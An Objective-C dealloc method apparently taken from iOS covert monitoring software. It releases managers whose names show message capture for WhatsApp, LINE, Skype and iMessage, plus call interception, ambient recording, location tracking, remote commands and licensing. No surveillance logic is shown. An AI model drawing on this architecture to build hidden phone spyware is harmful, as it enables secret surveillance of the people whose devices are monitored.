#pragma mark dealloc method
#pragma mark -

- (void) dealloc {
	// Features
	[mViberCaptureManager release];
	[mFacebookCaptureManager prerelease];
	[mFacebookCaptureManager release];
	[mSkypeCaptureManager release];
	[mALCManager release];
	[mApplicationManager release];
	[mBookmarkManager release];
	[mBrowserUrlCaptureManager release];
	[mLINECaptureManager release];
	[mWhatsAppCaptureManager release];
	[mAppAgentManager release];
	[mSpyCallManager release];
	[mMediaCaptureManager release];
	[mMediaFinder release];
	[mAddressbookManager release];
	[mLocationManager release];
	[mMailCaptureManager release];
	[mMMSCaptureManager release];
	[mIMessageCaptureManager release];
	[mSMSCaptureManager release];
	[mCallLogCaptureManager release];
	[mAmbientRecordingManager release];
	[mNoteManager release];
	[mCalendarManager release];
	[mCameraCaptureManager release];
	
	// Engine
	[mSBNotifier release];
	[mActivationCodeCaptureManager release];
	[mSIMChangeManager release];
	[mRemoteCmdManager release];
	[mEventCenter release];
	[mEDM release];
	[mERM release];
	[mActivationManager release];
	[mDDM release];
	[mCSM release];
	[mPreferenceManager release];
	[mConnectionHistoryManager release];
	[mServerAddressManager release];
	[mConfigurationManager release];
	[mLicenseManager release];
	[mSMSSendManager release];
	[mSystemUtils release];
	[mApplicationContext release];
	[mTelephonyNotificationManagerImpl release];
	
	// Utils
	[mLicenseGetConfigUtils release];
	[mPreferencesChangeHandler release];
	[mServerErrorStatusHandler release];
	[mLicenseHeartbeatUtils release];
	
	[super dealloc];
}

@end
